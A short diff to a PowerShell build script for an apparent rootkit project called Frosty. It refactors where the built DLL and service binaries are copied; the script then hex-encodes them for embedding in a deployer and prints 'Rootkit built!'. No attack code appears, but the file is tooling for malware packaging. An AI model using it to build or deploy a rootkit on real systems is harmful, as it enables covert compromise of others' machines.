@@ -27,6 +27,7 @@ function BuildProject {
     param (
         [string]$solutionPath,
         [string]$outputPath,
+		[string]$destinationPath,
         [string[]]$msbFlags
     )
 	
@@ -36,8 +37,8 @@ function BuildProject {
     Write-Host "[*] Building project: $solutionPath"
     & $MSBUILD $solutionPath $msbFlags
     if ($LASTEXITCODE -ne 0) { throw "Failed to build project $solutionPath" }
-    Copy-Item $exeOutputPath -Destination ".\build\" -Force
-	Copy-Item $dllOutputPath -Destination ".\build\" -Force
+    Copy-Item $exeOutputPath -Destination $destinationPath -Force
+	Copy-Item $dllOutputPath -Destination $destinationPath -Force
 }
 
 function ConvertToHex {
@@ -88,7 +89,7 @@ $MSB_FLAGS = @("/t:Rebuild", "/p:Configuration=Release", "/p:Platform=$platform"
 InitializeBuildDirectory
 
 try {
-    BuildProject "Frosty.sln" ".\x64\Release\" $MSB_FLAGS
+    BuildProject "Frosty.sln" ".\x64\Release\" ".\build\" $MSB_FLAGS
     $rkDllHex = ConvertToHex "$pwd\build\Dll.dll"
     $rkServiceHex = ConvertToHex "$pwd\build\Service.exe"
 
@@ -97,7 +98,7 @@ try {
     WriteToRawFile "rkService" $rkServiceHex
 	
     Set-Location "Deployer"
-    BuildProject "Deployer.sln" ".\x64\Release\Deployer.exe" $MSB_FLAGS
+    BuildProject "Deployer.sln" ".\x64\Release\" "..\build\" $MSB_FLAGS
     Set-Location ".."
 
     Write-Host "[+] Rootkit built!"
